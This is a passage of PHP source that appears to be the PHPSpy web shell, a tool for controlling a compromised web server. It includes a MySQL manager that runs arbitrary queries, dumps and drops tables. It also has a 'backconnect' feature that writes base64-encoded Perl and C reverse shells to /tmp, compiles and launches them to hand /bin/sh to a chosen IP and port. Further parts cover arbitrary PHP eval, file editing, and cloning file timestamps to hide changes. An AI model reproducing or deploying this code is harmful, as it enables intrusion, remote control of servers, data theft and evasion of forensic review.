href=\"javascript:mysqlfile(\\'mysqldown\\');\">Download</a></p>');\n\tmakehide('dbhost');\n\tmakehide('dbport');\n\tmakehide('dbuser');\n\tmakehide('dbpass');\n\tmakehide('dbname');\n\tmakehide('charset');\n\tmakehide('doing');\n\tmakehide('action','sqlfile');\n\tp('</form>');\n}\n\nelseif ($action == 'sqladmin') {\n\t!$dbhost && $dbhost = 'localhost';\n\t!$dbuser && $dbuser = 'root';\n\t!$dbport && $dbport = '3306';\n\t$dbform = '<input type=\"hidden\" id=\"connect\" name=\"connect\" value=\"1\" />';\n\tif(isset($dbhost)){\n\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbhost\\\" name=\\\"dbhost\\\" value=\\\"$dbhost\\\" />\\n\";\n\t}\n\tif(isset($dbuser)) {\n\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbuser\\\" name=\\\"dbuser\\\" value=\\\"$dbuser\\\" />\\n\";\n\t}\n\tif(isset($dbpass)) {\n\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbpass\\\" name=\\\"dbpass\\\" value=\\\"$dbpass\\\" />\\n\";\n\t}\n\tif(isset($dbport)) {\n\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbport\\\" name=\\\"dbport\\\" value=\\\"$dbport\\\" />\\n\";\n\t}\n\tif(isset($dbname)) {\n\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbname\\\" name=\\\"dbname\\\" value=\\\"$dbname\\\" />\\n\";\n\t}\n\tif(isset($charset)) {\n\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"charset\\\" name=\\\"charset\\\" value=\\\"$charset\\\" />\\n\";\n\t}\n\n\tif ($doing == 'backupmysql' && $saveasfile) {\n\t\tif (!$table) {\n\t\t\tm('Please choose the table');\n\t\t} else {\n\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n\t\t\t$table = array_flip($table);\n\t\t\t$fp = @fopen($path,'w');\n\t\t\tif ($fp) {\n\t\t\t\t$result = q('SHOW tables');\n\t\t\t\tif (!$result) p('<h2>'.mysql_error().'</h2>');\n\t\t\t\t$mysqldata = '';\n\t\t\t\twhile ($currow = mysql_fetch_array($result)) {\n\t\t\t\t\tif (isset($table[$currow[0]])) {\n\t\t\t\t\t\tsqldumptable($currow[0], $fp);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tfclose($fp);\n\t\t\t\t$fileurl = str_replace(SA_ROOT,'',$path);\n\t\t\t\tm('Database has success backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$path.'</a>');\n\t\t\t\tmysql_close();\n\t\t\t} else {\n\t\t\t\tm('Backup failed');\n\t\t\t}\n\t\t}\n\t}\n\tif ($insert && $insertsql) {\n\t\t$keystr = $valstr = $tmp = '';\n\t\tforeach($insertsql as $key => $val) {\n\t\t\tif ($val) {\n\t\t\t\t$keystr .= $tmp.$key;\n\t\t\t\t$valstr .= $tmp.\"'\".addslashes($val).\"'\";\n\t\t\t\t$tmp = ',';\n\t\t\t}\n\t\t}\n\t\tif ($keystr && $valstr) {\n\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n\t\t\tm(q(\"INSERT INTO $tablename ($keystr) VALUES ($valstr)\") ? 'Insert new record of success' : mysql_error());\n\t\t}\n\t}\n\tif ($update && $insertsql && $base64) {\n\t\t$valstr = $tmp = '';\n\t\tforeach($insertsql as $key => $val) {\n\t\t\t$valstr .= $tmp.$key.\"='\".addslashes($val).\"'\";\n\t\t\t$tmp = ',';\n\t\t}\n\t\tif ($valstr) {\n\t\t\t$where = base64_decode($base64);\n\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n\t\t\tm(q(\"UPDATE $tablename SET $valstr WHERE $where LIMIT 1\") ? 'Record updating' : mysql_error());\n\t\t}\n\t}\n\tif ($doing == 'del' && $base64) {\n\t\t$where = base64_decode($base64);\n\t\t$delete_sql = \"DELETE FROM $tablename WHERE $where\";\n\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n\t\tm(q(\"DELETE FROM $tablename WHERE $where\") ? 'Deletion record of success' : mysql_error());\n\t}\n\n\tif ($tablename && $doing == 'drop') {\n\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n\t\tif (q(\"DROP TABLE $tablename\")) {\n\t\t\tm('Drop table of success');\n\t\t\t$tablename = '';\n\t\t} else {\n\t\t\tm(mysql_error());\n\t\t}\n\t}\n\n\t$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');\n\n\tformhead(array('title'=>'MYSQL Manager'));\n\tmakehide('action','sqladmin');\n\tp('<p>');\n\tp('DBHost:');\n\tmakeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));\n\tp(':');\n\tmakeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));\n\tp('DBUser:');\n\tmakeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));\n\tp('DBPass:');\n\tmakeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));\n\tp('DBCharset:');\n\tmakeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));\n\tmakeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));\n\tp('</p>');\n\tformfoot();\n?>\n<script type=\"text/javascript\">\nfunction editrecord(action, base64, tablename){\n\tif (action == 'del') {\t\t\n\t\tif (!confirm('Is or isn\\'t deletion record?')) return;\n\t}\n\t$('recordlist').doing.value=action;\n\t$('recordlist').base64.value=base64;\n\t$('recordlist').tablename.value=tablename;\n\t$('recordlist').submit();\n}\nfunction moddbname(dbname) {\n\tif(!dbname) return;\n\t$('setdbname').dbname.value=dbname;\n\t$('setdbname').submit();\n}\nfunction settable(tablename,doing,page) {\n\tif(!tablename) return;\n\tif (doing) {\n\t\t$('settable').doing.value=doing;\n\t}\n\tif (page) {\n\t\t$('settable').page.value=page;\n\t}\n\t$('settable').tablename.value=tablename;\n\t$('settable').submit();\n}\n</script>\n<?php\n\t//????\n\tformhead(array('name'=>'recordlist'));\n\tmakehide('doing');\n\tmakehide('action','sqladmin');\n\tmakehide('base64');\n\tmakehide('tablename');\n\tp($dbform);\n\tformfoot();\n\n\t//?????\n\tformhead(array('name'=>'setdbname'));\n\tmakehide('action','sqladmin');\n\tp($dbform);\n\tif (!$dbname) {\n\t\tmakehide('dbname');\n\t}\n\tformfoot();\n\n\t//???\n\tformhead(array('name'=>'settable'));\n\tmakehide('action','sqladmin');\n\tp($dbform);\n\tmakehide('tablename');\n\tmakehide('page',$page);\n\tmakehide('doing');\n\tformfoot();\n\n\t$cachetables = array();\t\n\t$pagenum = 30;\n\t$page = intval($page);\n\tif($page) {\n\t\t$start_limit = ($page - 1) * $pagenum;\n\t} else {\n\t\t$start_limit = 0;\n\t\t$page = 1;\n\t}\n\tif (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {\n\t\tdbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);\n\t\t//???????\n\t\t$mysqlver = mysql_get_server_info();\n\t\tp('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');\n\t\t$highver = $mysqlver > '4.1' ? 1 : 0;\n\n\t\t//?????\n\t\t$query = q(\"SHOW DATABASES\");\n\t\t$dbs = array();\n\t\t$dbs[] = '-- Select a database --';\n\t\twhile($db = mysql_fetch_array($query)) {\n\t\t\t$dbs[$db['Database']] = $db['Database'];\n\t\t}\n\t\tmakeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));\n\t\t$tabledb = array();\n\t\tif ($dbname) {\n\t\t\tp('<p>');\n\t\t\tp('Current dababase: <a href=\"javascript:moddbname(\\''.$dbname.'\\');\">'.$dbname.'</a>');\n\t\t\tif ($tablename) {\n\t\t\t\tp(' | Current Table: <a href=\"javascript:settable(\\''.$tablename.'\\');\">'.$tablename.'</a> [ <a href=\"javascript:settable(\\''.$tablename.'\\', \\'insert\\');\">Insert</a> | <a href=\"javascript:settable(\\''.$tablename.'\\', \\'structure\\');\">Structure</a> | <a href=\"javascript:settable(\\''.$tablename.'\\', \\'drop\\');\">Drop</a> ]');\n\t\t\t}\n\t\t\tp('</p>');\n\t\t\tmysql_select_db($dbname);\n\n\t\t\t$getnumsql = '';\n\t\t\t$runquery = 0;\n\t\t\tif ($sql_query) {\n\t\t\t\t$runquery = 1;\n\t\t\t}\n\t\t\t$allowedit = 0;\n\t\t\tif ($tablename && !$sql_query) {\n\t\t\t\t$sql_query = \"SELECT * FROM $tablename\";\n\t\t\t\t$getnumsql = $sql_query;\n\t\t\t\t$sql_query = $sql_query.\" LIMIT $start_limit, $pagenum\";\n\t\t\t\t$allowedit = 1;\n\t\t\t}\n\t\t\tp('<form action=\"'.$self.'\" method=\"POST\">');\n\t\t\tp('<p><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name=\"sql_query\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /></td></tr></table></p>');\n\t\t\tmakehide('tablename', $tablename);\n\t\t\tmakehide('action','sqladmin');\n\t\t\tp($dbform);\n\t\t\tp('</form>');\n\t\t\tif ($tablename || ($runquery && $sql_query)) {\n\t\t\t\tif ($doing == 'structure') {\n\t\t\t\t\t$result = q(\"SHOW COLUMNS FROM $tablename\");\n\t\t\t\t\t$rowdb = array();\n\t\t\t\t\twhile($row = mysql_fetch_array($result)) {\n\t\t\t\t\t\t$rowdb[] = $row;\n\t\t\t\t\t}\n\t\t\t\t\tp('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');\n\t\t\t\t\tp('<tr class=\"head\">');\n\t\t\t\t\tp('<td>Field</td>');\n\t\t\t\t\tp('<td>Type</td>');\n\t\t\t\t\tp('<td>Null</td>');\n\t\t\t\t\tp('<td>Key</td>');\n\t\t\t\t\tp('<td>Default</td>');\n\t\t\t\t\tp('<td>Extra</td>');\n\t\t\t\t\tp('</tr>');\n\t\t\t\t\tforeach ($rowdb as $row) {\n\t\t\t\t\t\t$thisbg = bg();\n\t\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n\t\t\t\t\t\tp('<td>'.$row['Field'].'</td>');\n\t\t\t\t\t\tp('<td>'.$row['Type'].'</td>');\n\t\t\t\t\t\tp('<td>'.$row['Null'].'&nbsp;</td>');\n\t\t\t\t\t\tp('<td>'.$row['Key'].'&nbsp;</td>');\n\t\t\t\t\t\tp('<td>'.$row['Default'].'&nbsp;</td>');\n\t\t\t\t\t\tp('<td>'.$row['Extra'].'&nbsp;</td>');\n\t\t\t\t\t\tp('</tr>');\n\t\t\t\t\t}\n\t\t\t\t\ttbfoot();\n\t\t\t\t} elseif ($doing == 'insert' || $doing == 'edit') {\n\t\t\t\t\t$result = q('SHOW COLUMNS FROM '.$tablename);\n\t\t\t\t\twhile ($row = mysql_fetch_array($result)) {\n\t\t\t\t\t\t$rowdb[] = $row;\n\t\t\t\t\t}\n\t\t\t\t\t$rs = array();\n\t\t\t\t\tif ($doing == 'insert') {\n\t\t\t\t\t\tp('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');\n\t\t\t\t\t} else {\n\t\t\t\t\t\tp('<h2>Update record in '.$tablename.' table &raquo;</h2>');\n\t\t\t\t\t\t$where = base64_decode($base64);\n\t\t\t\t\t\t$result = q(\"SELECT * FROM $tablename WHERE $where LIMIT 1\");\n\t\t\t\t\t\t$rs = mysql_fetch_array($result);\n\t\t\t\t\t}\n\t\t\t\t\tp('<form method=\"post\" action=\"'.$self.'\">');\n\t\t\t\t\tp($dbform);\n\t\t\t\t\tmakehide('action','sqladmin');\n\t\t\t\t\tmakehide('tablename',$tablename);\n\t\t\t\t\tp('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');\n\t\t\t\t\tforeach ($rowdb as $row) {\n\t\t\t\t\t\tif ($rs[$row['Field']]) {\n\t\t\t\t\t\t\t$value = htmlspecialchars($rs[$row['Field']]);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t$value = '';\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$thisbg = bg();\n\t\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n\t\t\t\t\t\tp('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class=\"area\" name=\"insertsql['.$row['Field'].']\" style=\"width:500px;height:60px;overflow:auto;\">'.$value.'</textarea></td></tr>');\n\t\t\t\t\t}\n\t\t\t\t\tif ($doing == 'insert') {\n\t\t\t\t\t\tp('<tr class=\"'.bg().'\"><td colspan=\"2\"><input class=\"bt\" type=\"submit\" name=\"insert\" value=\"Insert\" /></td></tr>');\n\t\t\t\t\t} else {\n\t\t\t\t\t\tp('<tr class=\"'.bg().'\"><td colspan=\"2\"><input class=\"bt\" type=\"submit\" name=\"update\" value=\"Update\" /></td></tr>');\n\t\t\t\t\t\tmakehide('base64', $base64);\n\t\t\t\t\t}\n\t\t\t\t\tp('</table></form>');\n\t\t\t\t} else {\n\t\t\t\t\t$querys = @explode(';',$sql_query);\n\t\t\t\t\tforeach($querys as $num=>$query) {\n\t\t\t\t\t\tif ($query) {\n\t\t\t\t\t\t\tp(\"<p><b>Query#{$num} : \".htmlspecialchars($query,ENT_QUOTES).\"</b></p>\");\n\t\t\t\t\t\t\tswitch(qy($query))\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tcase 0:\n\t\t\t\t\t\t\t\t\tp('<h2>Error : '.mysql_error().'</h2>');\n\t\t\t\t\t\t\t\t\tbreak;\t\n\t\t\t\t\t\t\t\tcase 1:\n\t\t\t\t\t\t\t\t\tif (strtolower(substr($query,0,13)) == 'select * from') {\n\t\t\t\t\t\t\t\t\t\t$allowedit = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif ($getnumsql) {\n\t\t\t\t\t\t\t\t\t\t$tatol = mysql_num_rows(q($getnumsql));\n\t\t\t\t\t\t\t\t\t\t$multipage = multi($tatol, $pagenum, $page, $tablename);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif (!$tablename) {\n\t\t\t\t\t\t\t\t\t\t$sql_line = str_replace(array(\"\\r\", \"\\n\", \"\\t\"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));\n\t\t\t\t\t\t\t\t\t\t$sql_line = preg_replace(\"/\\/\\*[^(\\*\\/)]*\\*\\//i\", \" \", $sql_line);\n\t\t\t\t\t\t\t\t\t\tpreg_match_all(\"/from\\s+`{0,1}([\\w]+)`{0,1}\\s+/i\",$sql_line,$matches);\n\t\t\t\t\t\t\t\t\t\t$tablename = $matches[1][0];\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t$result = q($query);\n\t\t\t\t\t\t\t\t\tp($multipage);\n\t\t\t\t\t\t\t\t\tp('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');\n\t\t\t\t\t\t\t\t\tp('<tr class=\"head\">');\n\t\t\t\t\t\t\t\t\tif ($allowedit) p('<td>Action</td>');\n\t\t\t\t\t\t\t\t\t$fieldnum = @mysql_num_fields($result);\n\t\t\t\t\t\t\t\t\tfor($i=0;$i<$fieldnum;$i++){\n\t\t\t\t\t\t\t\t\t\t$name = @mysql_field_name($result, $i);\n\t\t\t\t\t\t\t\t\t\t$type = @mysql_field_type($result, $i);\n\t\t\t\t\t\t\t\t\t\t$len = @mysql_field_len($result, $i);\n\t\t\t\t\t\t\t\t\t\tp(\"<td nowrap>$name<br><span>$type($len)</span></td>\");\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tp('</tr>');\n\t\t\t\t\t\t\t\t\twhile($mn = @mysql_fetch_assoc($result)){\n\t\t\t\t\t\t\t\t\t\t$thisbg = bg();\n\t\t\t\t\t\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n\t\t\t\t\t\t\t\t\t\t$where = $tmp = $b1 = '';\n\t\t\t\t\t\t\t\t\t\tforeach($mn as $key=>$inside){\n\t\t\t\t\t\t\t\t\t\t\tif ($inside) {\n\t\t\t\t\t\t\t\t\t\t\t\t$where .= $tmp.$key.\"='\".addslashes($inside).\"'\";\n\t\t\t\t\t\t\t\t\t\t\t\t$tmp = ' AND ';\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$where = base64_encode($where);\n\t\t\t\t\t\t\t\t\t\tif ($allowedit) p('<td nowrap><a href=\"javascript:editrecord(\\'edit\\', \\''.$where.'\\', \\''.$tablename.'\\');\">Edit</a> | <a href=\"javascript:editrecord(\\'del\\', \\''.$where.'\\', \\''.$tablename.'\\');\">Del</a></td>');\n\t\t\t\t\t\t\t\t\t\tp($b1);\n\t\t\t\t\t\t\t\t\t\tp('</tr>');\n\t\t\t\t\t\t\t\t\t\tunset($b1);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\ttbfoot();\n\t\t\t\t\t\t\t\t\tp($multipage);\n\t\t\t\t\t\t\t\t\tbreak;\t\n\t\t\t\t\t\t\t\tcase 2:\n\t\t\t\t\t\t\t\t\t$ar = mysql_affected_rows();\n\t\t\t\t\t\t\t\t\tp('<h2>affected rows : <b>'.$ar.'</b></h2>');\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t$query = q(\"SHOW TABLE STATUS\");\n\t\t\t\t$table_num = $table_rows = $data_size = 0;\n\t\t\t\t$tabledb = array();\n\t\t\t\twhile($table = mysql_fetch_array($query)) {\n\t\t\t\t\t$data_size = $data_size + $table['Data_length'];\n\t\t\t\t\t$table_rows = $table_rows + $table['Rows'];\n\t\t\t\t\t$table['Data_length'] = sizecount($table['Data_length']);\n\t\t\t\t\t$table_num++;\n\t\t\t\t\t$tabledb[] = $table;\n\t\t\t\t}\n\t\t\t\t$data_size = sizecount($data_size);\n\t\t\t\tunset($table);\n\t\t\t\tp('<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">');\n\t\t\t\tp('<form action=\"'.$self.'\" method=\"POST\">');\n\t\t\t\tmakehide('action','sqladmin');\n\t\t\t\tp($dbform);\n\t\t\t\tp('<tr class=\"head\">');\n\t\t\t\tp('<td width=\"2%\" align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.form)\" /></td>');\n\t\t\t\tp('<td>Name</td>');\n\t\t\t\tp('<td>Rows</td>');\n\t\t\t\tp('<td>Data_length</td>');\n\t\t\t\tp('<td>Create_time</td>');\n\t\t\t\tp('<td>Update_time</td>');\n\t\t\t\tif ($highver) {\n\t\t\t\t\tp('<td>Engine</td>');\n\t\t\t\t\tp('<td>Collation</td>');\n\t\t\t\t}\n\t\t\t\tp('</tr>');\n\t\t\t\tforeach ($tabledb as $key => $table) {\n\t\t\t\t\t$thisbg = bg();\n\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n\t\t\t\t\tp('<td align=\"center\" width=\"2%\"><input type=\"checkbox\" name=\"table[]\" value=\"'.$table['Name'].'\" /></td>');\n\t\t\t\t\tp('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\');\">'.$table['Name'].'</a> [ <a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'insert\\');\">Insert</a> | <a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'structure\\');\">Structure</a> | <a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'drop\\');\">Drop</a> ]</td>');\n\t\t\t\t\tp('<td>'.$table['Rows'].'</td>');\n\t\t\t\t\tp('<td>'.$table['Data_length'].'</td>');\n\t\t\t\t\tp('<td>'.$table['Create_time'].'</td>');\n\t\t\t\t\tp('<td>'.$table['Update_time'].'</td>');\n\t\t\t\t\tif ($highver) {\n\t\t\t\t\t\tp('<td>'.$table['Engine'].'</td>');\n\t\t\t\t\t\tp('<td>'.$table['Collation'].'</td>');\n\t\t\t\t\t}\n\t\t\t\t\tp('</tr>');\n\t\t\t\t}\n\t\t\t\tp('<tr class='.bg().'>');\n\t\t\t\tp('<td>&nbsp;</td>');\n\t\t\t\tp('<td>Total tables: '.$table_num.'</td>');\n\t\t\t\tp('<td>'.$table_rows.'</td>');\n\t\t\t\tp('<td>'.$data_size.'</td>');\n\t\t\t\tp('<td colspan=\"'.($highver ? 4 : 2).'\">&nbsp;</td>');\n\t\t\t\tp('</tr>');\n\n\t\t\t\tp(\"<tr class=\\\"\".bg().\"\\\"><td colspan=\\\"\".($highver ? 8 : 6).\"\\\"><input name=\\\"saveasfile\\\" value=\\\"1\\\" type=\\\"checkbox\\\" /> Save as file <input class=\\\"input\\\" name=\\\"path\\\" value=\\\"\".SA_ROOT.$_SERVER['HTTP_HOST'].\"_MySQL.sql\\\" type=\\\"text\\\" size=\\\"60\\\" /> <input class=\\\"bt\\\" type=\\\"submit\\\" name=\\\"downrar\\\" value=\\\"Export selection table\\\" /></td></tr>\");\n\t\t\t\tmakehide('doing','backupmysql');\n\t\t\t\tformfoot();\n\t\t\t\tp(\"</table>\");\n\t\t\t\tfr($query);\n\t\t\t}\n\t\t}\n\t}\n\ttbfoot();\n\t@mysql_close();\n}//end sql backup\n\n\nelseif ($action == 'backconnect') {\n\t!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];\n\t!$yourport && $yourport = '12345';\n\t$usedb = array('perl'=>'perl','c'=>'c');\n\n\t$back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\".\n\t\t\"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\".\n\t\t\"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\".\n\t\t\"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\".\n\t\t\"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\".\n\t\t\"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\".\n\t\t\"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";\n\t$back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\".\n\t\t\"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\".\n\t\t\"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\".\n\t\t\"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\".\n\t\t\"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\".\n\t\t\"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\".\n\t\t\"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\".\n\t\t\"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\";\n\n\tif ($start && $yourip && $yourport && $use){\n\t\tif ($use == 'perl') {\n\t\t\tcf('/tmp/angel_bc',$back_connect);\n\t\t\t$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");\n\t\t} else {\n\t\t\tcf('/tmp/angel_bc.c',$back_connect_c);\n\t\t\t$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');\n\t\t\t@unlink('/tmp/angel_bc.c');\n\t\t\t$res = execute(\"/tmp/angel_bc $yourip $yourport &\");\n\t\t}\n\t\tm(\"Now script try connect to $yourip port $yourport ...\");\n\t}\n\n\tformhead(array('title'=>'Back Connect'));\n\tmakehide('action','backconnect');\n\tp('<p>');\n\tp('Your IP:');\n\tmakeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));\n\tp('Your Port:');\n\tmakeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));\n\tp('Use:');\n\tmakeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));\n\tmakeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));\n\tp('</p>');\n\tformfoot();\n}//end sql backup\n\nelseif ($action == 'eval') {\n\t$phpcode = trim($phpcode);\n\tif($phpcode){\n\t\tif (!preg_match('#<\\?#si', $phpcode)) {\n\t\t\t$phpcode = \"<?php\\n\\n{$phpcode}\\n\\n?>\";\n\t\t}\n\t\teval(\"?\".\">$phpcode<?\");\n\t}\n\tformhead(array('title'=>'Eval PHP Code'));\n\tmakehide('action','eval');\n\tmaketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));\n\tp('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');\n\tformfooter();\n}//end eval\n\nelseif ($action == 'editfile') {\n\tif(file_exists($opfile)) {\n\t\t$fp=@fopen($opfile,'r');\n\t\t$contents=@fread($fp, filesize($opfile));\n\t\t@fclose($fp);\n\t\t$contents=htmlspecialchars($contents);\n\t}\n\tformhead(array('title'=>'Create / Edit File'));\n\tmakehide('action','file');\n\tmakehide('dir',$nowpath);\n\tmakeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));\n\tmaketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));\n\tformfooter();\n}//end editfile\n\nelseif ($action == 'newtime') {\n\t$opfilemtime = @filemtime($opfile);\n\t//$time = strtotime(\"$year-$month-$day $hour:$minute:$second\");\n\t$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);\n\tformhead(array('title'=>'Clone file was last modified time'));\n\tmakehide('action','file');\n\tmakehide('dir',$nowpath);\n\tmakeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));\n\tmakeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));\n\tformfooter();\n\tformhead(array('title'=>'Set last modified'));\n\tmakehide('action','file');\n\tmakehide('dir',$nowpath);\n\tmakeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));\n\tp('<p>Instead 